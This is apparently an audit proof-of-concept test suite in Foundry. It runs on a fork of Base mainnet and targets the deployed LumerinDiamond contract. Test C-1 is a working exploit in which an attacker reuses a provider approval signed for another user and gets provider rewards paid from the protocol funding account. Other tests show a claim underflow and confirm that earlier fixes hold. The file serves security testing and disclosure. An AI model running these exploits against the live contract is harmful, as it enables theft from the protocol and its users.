// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IDiamond {
    struct Session {
        address user;
        bytes32 bidId;
        uint256 stake;
        bytes closeoutReceipt;
        uint256 closeoutType;
        uint256 providerWithdrawnAmount;
        uint128 openedAt;
        uint128 endsAt;
        uint128 closedAt;
        bool isActive;
        bool isDirectPaymentFromUser;
    }
    struct Provider {
        string endpoint;
        uint256 stake;
        uint128 createdAt;
        uint128 limitPeriodEnd;
        uint256 limitPeriodEarned;
        bool isDeleted;
    }
    struct Model {
        bytes32 ipfsCID;
        uint256 fee;
        uint256 stake;
        address owner;
        string name;
        string[] tags;
        uint128 createdAt;
        bool isDeleted;
    }
    struct Bid {
        address provider;
        bytes32 modelId;
        uint256 pricePerSecond;
        uint256 nonce;
        uint128 createdAt;
        uint128 deletedAt;
    }

    function providerRegister(address provider_, uint256 amount_, string calldata endpoint_) external;
    function providerDeregister(address provider_) external;
    function modelRegister(
        address modelOwner_,
        bytes32 baseModelId_,
        bytes32 ipfsCID_,
        uint256 fee_,
        uint256 amount_,
        string calldata name_,
        string[] memory tags_
    ) external;
    function modelDeregister(bytes32 modelId_) external;
    function postModelBid(address provider_, bytes32 modelId_, uint256 pricePerSecond_) external returns (bytes32 bidId);
    function deleteModelBid(bytes32 bidId_) external;
    function getBidId(address provider_, bytes32 modelId_, uint256 nonce_) external view returns (bytes32);
    function getModelId(address account_, bytes32 baseModelId_) external view returns (bytes32);
    function getBid(bytes32 bidId_) external view returns (Bid memory);
    function getProvider(address provider_) external view returns (Provider memory);
    function getModel(bytes32 modelId_) external view returns (Model memory);
    function getSession(bytes32 sessionId_) external view returns (Session memory);
    function openSession(
        address user_,
        uint256 amount_,
        bool isDirectPaymentFromUser_,
        bytes calldata approvalEncoded_,
        bytes calldata signature_
    ) external returns (bytes32);
    function closeSession(bytes calldata receiptEncoded_, bytes calldata signature_) external;
    function claimForProvider(bytes32 sessionId_) external;
    function getUserStakesOnHold(address user_, uint8 iterations_) external view returns (uint256, uint256);
    function withdrawUserStakes(address user_, uint8 iterations_) external;
    function getIsProviderApprovalUsed(bytes memory approval_) external view returns (bool);
    function stakeToStipend(uint256 amount_, uint128 timestamp_) external view returns (uint256);
    function getProvidersTotalClaimed() external view returns (uint256);
}

/// @notice S3 fork PoCs vs LumerinDiamond on Base, pinned block 58512580.
/// @dev C-1 = provider approval NOT bound to user (Lumerin-1 M-2 fix absent).
///      C-2/C-3/C-4/C-5 = negative / observation checks (fixes that DO hold).
contract S3Test is Test {
    address constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3; // MOROFT on Base
    address constant FUNDING = 0x5160C0311A95E0A1072FA85Df23712A7BA1cD4b1;
    uint256 constant CHAIN_ID = 8453;
    uint256 constant PINNED_BLOCK = 58512580;

    uint256 constant PROVIDER_PK = 0x1111111111111111111111111111111111111111111111111111111111111111;
    uint256 constant VICTIM_PK = 0x2222222222222222222222222222222222222222222222222222222222222222;
    uint256 constant ATTACKER_PK = 0x3333333333333333333333333333333333333333333333333333333333333333;
    uint256 constant USER2_PK = 0x4444444444444444444444444444444444444444444444444444444444444444;

    address provider;
    address victim;
    address attacker;
    address user2;

    bytes32 bidId;
    bytes32 modelId;

    function setUp() public {
        vm.createSelectFork("https://base.publicnode.com", PINNED_BLOCK);
        provider = vm.addr(PROVIDER_PK);
        victim = vm.addr(VICTIM_PK);
        attacker = vm.addr(ATTACKER_PK);
        user2 = vm.addr(USER2_PK);

        // Fund test accounts with MOROFT (deal first; fallback to diamond transfer).
        _fund(provider, 200_000 ether);
        _fund(victim, 50_000 ether);
        _fund(attacker, 50_000 ether);
        _fund(user2, 50_000 ether);

        vm.prank(provider);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
        vm.prank(victim);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
        vm.prank(attacker);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
        vm.prank(user2);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);

        _setupProviderAndBid(100_000 ether, 1e16);
    }

    function _fund(address who, uint256 amt) internal {
        deal(MOR, who, amt);
        if (IERC20(MOR).balanceOf(who) < amt) {
            // deal() could not find the slot: pull from the diamond's own balance.
            vm.prank(DIAMOND);
            IERC20(MOR).transfer(who, amt);
        }
        assertGe(IERC20(MOR).balanceOf(who), amt, "funding failed");
    }

    function _setupProviderAndBid(uint256 providerStake, uint256 pricePerSecond) internal {
        vm.prank(provider);
        IDiamond(DIAMOND).providerRegister(provider, providerStake, "https://provider.example:8082");
        bytes32 baseModelId = keccak256("test-model");
        vm.prank(provider);
        string[] memory tags = new string[](1);
        tags[0] = "test";
        IDiamond(DIAMOND).modelRegister(provider, baseModelId, keccak256("ipfs"), 0, 1 ether, "test-model", tags);
        modelId = IDiamond(DIAMOND).getModelId(provider, baseModelId);
        vm.prank(provider);
        bidId = IDiamond(DIAMOND).postModelBid(provider, modelId, pricePerSecond);
    }

    /// @dev Provider signs an approval whose encoded user is `forUser`.
    function _approvalFor(address forUser) internal view returns (bytes memory approval, bytes memory sig) {
        approval = abi.encode(bidId, CHAIN_ID, forUser, uint128(block.timestamp));
        bytes32 digest = keccak256(approval);
        bytes32 ethSigned = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PROVIDER_PK, ethSigned);
        sig = abi.encodePacked(r, s, v);
    }

    function _receiptFor(bytes32 sessionId, uint32 tpsScaled1000, uint32 ttftMs) internal view returns (bytes memory receipt, bytes memory sig) {
        return _receiptForSigned(sessionId, PROVIDER_PK, tpsScaled1000, ttftMs);
    }

    function _receiptForSigned(bytes32 sessionId, uint256 signerPk, uint32 tpsScaled1000, uint32 ttftMs)
        internal
        view
        returns (bytes memory receipt, bytes memory sig)
    {
        receipt = abi.encode(sessionId, CHAIN_ID, uint128(block.timestamp), tpsScaled1000, ttftMs);
        bytes32 digest = keccak256(receipt);
        bytes32 ethSigned = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, ethSigned);
        sig = abi.encodePacked(r, s, v);
    }

    function _openAs(address user, uint256 amount, bool direct, bytes memory approval, bytes memory sig)
        internal
        returns (bytes32 sessionId)
    {
        vm.prank(user);
        sessionId = IDiamond(DIAMOND).openSession(user, amount, direct, approval, sig);
    }

    // ---------------------------------------------------------------- C-1 ---
    /// @notice Approval issued for VICTIM is used by ATTACKER to open a session
    ///         as himself; provider is then paid from the protocol funding account.
    function test_C1_approvalForVictimUsableByAttacker() public {
        (bytes memory approval, bytes memory sig) = _approvalFor(victim);

        uint256 attackerBalBefore = IERC20(MOR).balanceOf(attacker);
        uint256 fundingBefore = IERC20(MOR).balanceOf(FUNDING);

        // Attacker opens a NON-direct session with the victim's approval.
        vm.prank(attacker);
        bytes32 sessionId = IDiamond(DIAMOND).openSession(attacker, 10_000 ether, false, approval, sig);

        IDiamond.Session memory sess = IDiamond(DIAMOND).getSession(sessionId);
        assertEq(sess.user, attacker, "session user must be attacker (bug: approval not user-bound)");
        assertEq(sess.stake, 10_000 ether);
        assertTrue(IDiamond(DIAMOND).getIsProviderApprovalUsed(approval), "approval consumed");

        // Victim's own attempt with the same approval now reverts (stolen).
        vm.expectRevert();
        vm.prank(victim);
        IDiamond(DIAMOND).openSession(victim, 10_000 ether, false, approval, sig);

        // Run the session to expiry, close it. The provider is paid IN FULL
        // at close from the protocol funding account (non-direct mode).
        vm.warp(sess.endsAt);
        (bytes memory receipt, bytes memory rsig) = _receiptFor(sessionId, 1000, 100);
        vm.prank(attacker);
        IDiamond(DIAMOND).closeSession(receipt, rsig);

        uint256 expectedReward = (uint256(sess.endsAt) - uint256(sess.openedAt)) * 1e16;
        uint256 fundingAfter = IERC20(MOR).balanceOf(FUNDING);
        assertEq(fundingBefore - fundingAfter, expectedReward, "funding account paid provider at close");
        assertEq(
            IERC20(MOR).balanceOf(provider) - (200_000 ether - 100_000 ether - 1 ether - 0.3 ether),
            expectedReward,
            "provider got reward"
        );
        // Attacker stake: fully returned after the day-lock releases (see C-3 asserts below).
        (uint256 available, uint256 hold) = IDiamond(DIAMOND).getUserStakesOnHold(attacker, 10);
        assertGt(hold, 9_900 ether, "used stipend day-locked (fix working)");
        assertEq(available, 0, "nothing immediately available from holds");
        assertEq(IERC20(MOR).balanceOf(attacker), attackerBalBefore - hold, "attacker outlay = locked stake only");
        emit log_named_uint("C1 provider reward (MOR, 1e18)", expectedReward);
        emit log_named_uint("C1 attacker stake locked (MOR, 1e18)", hold);
    }

    /// @dev Control: the same approval works for the intended victim (sanity).
    function test_C1_control_victimCanUseOwnApproval() public {
        (bytes memory approval, bytes memory sig) = _approvalFor(victim);
        bytes32 sessionId = _openAs(victim, 10_000 ether, false, approval, sig);
        assertEq(IDiamond(DIAMOND).getSession(sessionId).user, victim);
    }

    // ---------------------------------------------------------------- C-6 ---
    /// @notice NEW: claimForProvider underflows (panic 0x11) when called after
    ///         a session whose provider was already paid in full at close, while
    ///         the on-hold window is still open. Root cause: claimForProvider
    ///         subtracts _getProviderOnHoldAmount (computed from closedAt, i.e.
    ///         the FULL elapsed time) from _getProviderRewards (already net of
    ///         providerWithdrawnAmount). After a full payment the remainder is 0
    ///         but the hold is still positive -> 0 - hold underflows.
    function test_C6_claimForProviderUnderflowsAfterFullPayment() public {
        (bytes memory approval, bytes memory sig) = _approvalFor(victim);
        bytes32 sessionId = _openAs(victim, 10_000 ether, false, approval, sig);
        IDiamond.Session memory sess = IDiamond(DIAMOND).getSession(sessionId);
        vm.warp(sess.endsAt);
        (bytes memory receipt, bytes memory rsig) = _receiptFor(sessionId, 1000, 100);
        vm.prank(victim);
        IDiamond(DIAMOND).closeSession(receipt, rsig); // provider paid in full here

        // Standalone claim now reverts with arithmetic underflow.
        vm.expectRevert();
        vm.prank(provider);
        IDiamond(DIAMOND).claimForProvider(sessionId);

        // After the hold window it no longer reverts (hold = 0, amount = 0).
        IDiamond.Session memory closed = IDiamond(DIAMOND).getSession(sessionId);
        uint256 startOfClosedDay = uint256(closed.closedAt) - (uint256(closed.closedAt) % 1 days);
        vm.warp(startOfClosedDay + 1 days);
        vm.prank(provider);
        IDiamond(DIAMOND).claimForProvider(sessionId); // must not revert
        emit log_string("C6 underflow confirmed within window; no revert after window");
    }

    function _setupSmallProvider() internal returns (address smallProvider, bytes32 smallBid) {
        uint256 smallPk = 0x5555555555555555555555555555555555555555555555555555555555555555;
        smallProvider = vm.addr(smallPk);
        _fund(smallProvider, 100 ether);
        vm.prank(smallProvider);
        IERC20(MOR).approve(DIAMOND, type(uint256).max);
        vm.prank(smallProvider);
        IDiamond(DIAMOND).providerRegister(smallProvider, 5 ether, "https://small.example:8082");
        bytes32 baseModelId = keccak256("small-model");
        vm.prank(smallProvider);
        string[] memory tags = new string[](1);
        tags[0] = "test";
        IDiamond(DIAMOND).modelRegister(smallProvider, baseModelId, keccak256("ipfs"), 0, 1 ether, "small-model", tags);
        bytes32 smallModelId = IDiamond(DIAMOND).getModelId(smallProvider, baseModelId);
        vm.prank(smallProvider);
        smallBid = IDiamond(DIAMOND).postModelBid(smallProvider, smallModelId, 1e16);
    }

    function _signApproval(bytes32 bid, address forUser, uint256 signerPk)
        internal
        view
        returns (bytes memory approval, bytes memory sig)
    {
        approval = abi.encode(bid, CHAIN_ID, forUser, uint128(block.timestamp));
        bytes32 digest = keccak256(approval);
        bytes32 ethSigned = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, ethSigned);
        sig = abi.encodePacked(r, s, v);
    }

    /// @notice C-6 variant: the underflow also blocks a LEGITIMATE remainder
    ///         when the close-time payment was capped by the provider stake
    ///         limit. Small-stake provider (5 MOR) earns ~29 MOR; close pays 5
    ///         (capped); the remaining ~24 MOR cannot be claimed within the
    ///         window (revert), only after it (once stake is topped up).
    function test_C6b_cappedRemainderBlockedWithinWindow() public {
        uint256 smallPk = 0x5555555555555555555555555555555555555555555555555555555555555555;
        (address smallProvider, bytes32 smallBid) = _setupSmallProvider();
        (bytes memory approval, bytes memory sig) = _signApproval(smallBid, victim, smallPk);

        bytes32 sessionId = _openAs(victim, 10_000 ether, false, approval, sig);
        IDiamond.Session memory sess = IDiamond(DIAMOND).getSession(sessionId);
        uint256 fullReward = (uint256(sess.endsAt) - uint256(sess.openedAt)) * 1e16;
        assertGt(fullReward, 5 ether, "reward must exceed small stake cap");

        vm.warp(sess.endsAt);
        (bytes memory receipt, bytes memory rsig) = _receiptFor2(sessionId, smallPk, 1000, 100);
        vm.prank(victim);
        IDiamond(DIAMOND).closeSession(receipt, rsig);
        // Close paid only the 5 MOR cap.
        assertEq(IDiamond(DIAMOND).getSession(sessionId).providerWithdrawnAmount, 5 ether, "close capped at stake");

        // Claiming the ~24 MOR remainder within the window reverts (underflow).
        vm.expectRevert();
        vm.prank(smallProvider);
        IDiamond(DIAMOND).claimForProvider(sessionId);

        // After the window + a stake top-up, the remainder becomes claimable.
        IDiamond.Session memory closed = IDiamond(DIAMOND).getSession(sessionId);
        uint256 startOfClosedDay = uint256(closed.closedAt) - (uint256(closed.closedAt) % 1 days);
        vm.warp(startOfClosedDay + 1 days);
        vm.prank(smallProvider);
        IDiamond(DIAMOND).providerRegister(smallProvider, 30 ether, "https://small.example:8082");
        uint256 balBefore = IERC20(MOR).balanceOf(smallProvider);
        vm.prank(smallProvider);
        IDiamond(DIAMOND).claimForProvider(sessionId);
        assertEq(IERC20(MOR).balanceOf(smallProvider) - balBefore, fullReward - 5 ether, "remainder claimable after window");
        emit log_named_uint("C6b blocked remainder (MOR, 1e18)", fullReward - 5 ether);
    }

    function _receiptFor2(bytes32 sessionId, uint256 signerPk, uint32 tpsScaled1000, uint32 ttftMs)
        internal
        view
        returns (bytes memory receipt, bytes memory sig)
    {
        receipt = abi.encode(sessionId, CHAIN_ID, uint128(block.timestamp), tpsScaled1000, ttftMs);
        bytes32 digest = keccak256(receipt);
        bytes32 ethSigned = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, ethSigned);
        sig = abi.encodePacked(r, s, v);
    }

    // ---------------------------------------------------------------- C-3 ---
    /// @notice Day-lock fix holds: late same-day close locks the used stipend
    ///         until next UTC day; withdraw before releaseAt reverts.
    function test_C3_dayLockHolds() public {
        (bytes memory approval, bytes memory sig) = _approvalFor(victim);
        bytes32 sessionId = _openAs(victim, 10_000 ether, false, approval, sig);
        IDiamond.Session memory sess = IDiamond(DIAMOND).getSession(sessionId);

        vm.warp(sess.endsAt); // late close, same UTC day as open
        (bytes memory receipt, bytes memory rsig) = _receiptFor(sessionId, 1000, 100);
        vm.prank(victim);
        IDiamond(DIAMOND).closeSession(receipt, rsig);

        (uint256 available, uint256 hold) = IDiamond(DIAMOND).getUserStakesOnHold(victim, 10);
        assertGt(hold, 9_900 ether, "used stake must be locked");
        // withdraw before releaseAt must revert (nothing available)
        vm.expectRevert();
        vm.prank(victim);
        IDiamond(DIAMOND).withdrawUserStakes(victim, 10);

        // After next UTC day the locked stake is withdrawable in full.
        uint256 startOfEndDay = uint256(sess.endsAt) - (uint256(sess.endsAt) % 1 days);
        vm.warp(startOfEndDay + 1 days);
        uint256 balBefore = IERC20(MOR).balanceOf(victim);
        vm.prank(victim);
        IDiamond(DIAMOND).withdrawUserStakes(victim, 10);
        assertEq(IERC20(MOR).balanceOf(victim) - balBefore, hold, "locked stake released next day");
        emit log_named_uint("C3 locked stake released (MOR, 1e18)", hold);
    }

    // ---------------------------------------------------------------- C-2 ---
    /// @notice Provider limit-period underflow is NOT reachable: after the 365d
    ///         period expires + full deregister + small re-register, the next
    ///         claim resets the period instead of underflowing (negative PoC).
    function test_C2_noUnderflowAfterExpiryDeregisterRestake() public {
        // Earn once so limitPeriodEarned > 0.
        (bytes memory approval, bytes memory sig) = _approvalFor(victim);
        bytes32 sessionId = _openAs(victim, 10_000 ether, false, approval, sig);
        IDiamond.Session memory sess = IDiamond(DIAMOND).getSession(sessionId);
        vm.warp(sess.endsAt);
        (bytes memory receipt, bytes memory rsig) = _receiptFor(sessionId, 1000, 100);
        vm.prank(victim);
        IDiamond(DIAMOND).closeSession(receipt, rsig);
        // Note: no explicit claimForProvider here -- the late close already
        // pays the provider in full, and a redundant claim would revert with
        // the C-6 underflow. Earned is recorded at close.
        uint256 earned = IDiamond(DIAMOND).getProvider(provider).limitPeriodEarned;
        assertGt(earned, 0, "provider earned something");

        // 366 days later: deregister (full withdraw, stake -> 0, earned stays).
        vm.warp(block.timestamp + 366 days);
        vm.prank(provider);
        IDiamond(DIAMOND).deleteModelBid(bidId);
        uint256 provBalBefore = IERC20(MOR).balanceOf(provider);
        vm.prank(provider);
        IDiamond(DIAMOND).providerDeregister(provider);
        assertEq(IERC20(MOR).balanceOf(provider) - provBalBefore, 100_000 ether, "full stake withdrawn after expiry");
        assertEq(IDiamond(DIAMOND).getProvider(provider).stake, 0);

        // Re-register with 1 MOR -- far below the stale earned amount.
        vm.prank(provider);
        IDiamond(DIAMOND).providerRegister(provider, 1 ether, "https://provider.example:8082");
        assertEq(IDiamond(DIAMOND).getProvider(provider).stake, 1 ether);
        assertGt(IDiamond(DIAMOND).getProvider(provider).limitPeriodEarned, 1 ether, "stale earned > new stake");

        // New bid + session + close + claim must NOT revert (period resets).
        vm.prank(provider);
        bytes32 bid2 = IDiamond(DIAMOND).postModelBid(provider, modelId, 1e16);
        (bytes memory approval2, bytes memory sig2) = _approvalFor2(bid2, victim);
        bytes32 session2 = _openAs(victim, 10_000 ether, false, approval2, sig2);
        IDiamond.Session memory sess2 = IDiamond(DIAMOND).getSession(session2);
        vm.warp(sess2.endsAt);
        (bytes memory receipt2, bytes memory rsig2) = _receiptFor(session2, 1000, 100);
        vm.prank(victim);
        IDiamond(DIAMOND).closeSession(receipt2, rsig2); // would revert on stake/earned underflow
        // The close itself exercises _claimForProvider with the reset period:
        // provider is paid the 1 MOR cap, earned resets to that 1 MOR.
        assertEq(IDiamond(DIAMOND).getSession(session2).providerWithdrawnAmount, 1 ether, "close paid capped 1 MOR");
        assertEq(IDiamond(DIAMOND).getProvider(provider).limitPeriodEarned, 1 ether, "period reset, earned = 1 MOR");
        // (A standalone claimForProvider here would hit the separate C-6
        // underflow, not the C-2 invariant, so it is not asserted here.)
        emit log_string("C2 no underflow: close succeeded after expiry/deregister/small-restake");
    }

    function _approvalFor2(bytes32 bid, address forUser) internal view returns (bytes memory approval, bytes memory sig) {
        approval = abi.encode(bid, CHAIN_ID, forUser, uint128(block.timestamp));
        bytes32 digest = keccak256(approval);
        bytes32 ethSigned = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", digest));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PROVIDER_PK, ethSigned);
        sig = abi.encodePacked(r, s, v);
    }

    // ---------------------------------------------------------------- C-4 ---
    /// @notice Observation: provider can claim the FULL reward of an expired
    ///         but unclosed session via claimForProvider (no dispute possible).
    ///         Late close pays in full anyway, so no marginal protocol loss.
    function test_C4_preCloseClaimPaysFull() public {
        (bytes memory approval, bytes memory sig) = _approvalFor(victim);
        bytes32 sessionId = _openAs(victim, 10_000 ether, false, approval, sig);
        IDiamond.Session memory sess = IDiamond(DIAMOND).getSession(sessionId);
        uint256 expectedReward = (uint256(sess.endsAt) - uint256(sess.openedAt)) * 1e16;

        vm.warp(sess.endsAt + 60); // expired, never closed
        uint256 fundingBefore = IERC20(MOR).balanceOf(FUNDING);
        vm.prank(provider);
        IDiamond(DIAMOND).claimForProvider(sessionId);
        assertEq(fundingBefore - IERC20(MOR).balanceOf(FUNDING), expectedReward, "pre-close claim pays full reward");

        // Later close still works; provider gets nothing more; user refunded.
        (bytes memory receipt, bytes memory rsig) = _receiptFor(sessionId, 1000, 100);
        vm.prank(victim);
        IDiamond(DIAMOND).closeSession(receipt, rsig);
        emit log_named_uint("C4 pre-close provider reward (MOR, 1e18)", expectedReward);
    }

    // ------------------------------------------------- dispute hold (H-1) ---
    /// @notice Negative: disputed early close withholds the provider reward
    ///         for the day; claimable in full only after the hold window.
    function test_H1fix_disputedEarlyCloseHoldsProviderReward() public {
        (bytes memory approval, bytes memory sig) = _approvalFor(victim);
        bytes32 sessionId = _openAs(victim, 10_000 ether, false, approval, sig);
        IDiamond.Session memory sess = IDiamond(DIAMOND).getSession(sessionId);

        vm.warp(uint256(sess.openedAt) + 1000); // early close, 1000s elapsed
        // Wrong-signer (but well-formed 65-byte) signature => dispute path
        // (noDispute = false). A malformed-length signature would revert in
        // ECDSA.recover instead, so the dispute path needs a valid-length sig.
        (bytes memory receipt, bytes memory rsig) = _receiptForSigned(sessionId, ATTACKER_PK, 1000, 100);
        vm.prank(victim);
        IDiamond(DIAMOND).closeSession(receipt, rsig);

        uint256 closedAt = block.timestamp;
        // Provider claims immediately: held amount must NOT be payable yet.
        uint256 fundingBefore = IERC20(MOR).balanceOf(FUNDING);
        vm.prank(provider);
        IDiamond(DIAMOND).claimForProvider(sessionId);
        assertEq(fundingBefore - IERC20(MOR).balanceOf(FUNDING), 0, "disputed reward held at close");

        // After the hold window the full 1000s * price is claimable.
        uint256 startOfClosedDay = closedAt - (closedAt % 1 days);
        vm.warp(startOfClosedDay + 1 days);
        fundingBefore = IERC20(MOR).balanceOf(FUNDING);
        vm.prank(provider);
        IDiamond(DIAMOND).claimForProvider(sessionId);
        assertEq(fundingBefore - IERC20(MOR).balanceOf(FUNDING), 1000 * 1e16, "held reward released after 1 day");
    }

    // ------------------------------------------------- re-register (M-5/M-6) ---
    /// @notice Negative: provider/model re-registration accounting is sound.
    function test_M56fix_reregistrationAccounting() public {
        // Provider deregisters within period (earned = 0) -> full stake back.
        vm.prank(provider);
        IDiamond(DIAMOND).deleteModelBid(bidId);
        vm.prank(provider);
        IDiamond(DIAMOND).providerDeregister(provider);
        assertEq(IDiamond(DIAMOND).getProvider(provider).stake, 0);
        assertTrue(IDiamond(DIAMOND).getProvider(provider).isDeleted);

        // Re-register with a different amount: stake is exactly the new amount.
        vm.prank(provider);
        IDiamond(DIAMOND).providerRegister(provider, 50 ether, "https://provider.example:8082");
        IDiamond.Provider memory p = IDiamond(DIAMOND).getProvider(provider);
        assertEq(p.stake, 50 ether, "re-registered stake must equal new amount only");
        assertFalse(p.isDeleted);

        // Model deregister + re-register: stake is exactly the new amount.
        vm.prank(provider);
        IDiamond(DIAMOND).modelDeregister(modelId);
        assertEq(IDiamond(DIAMOND).getModel(modelId).stake, 0);
        vm.prank(provider);
        string[] memory tags = new string[](1);
        tags[0] = "test";
        IDiamond(DIAMOND).modelRegister(provider, keccak256("test-model"), keccak256("ipfs"), 0, 5 ether, "test-model", tags);
        assertEq(IDiamond(DIAMOND).getModel(modelId).stake, 5 ether, "re-registered model stake must equal new amount only");
    }
}
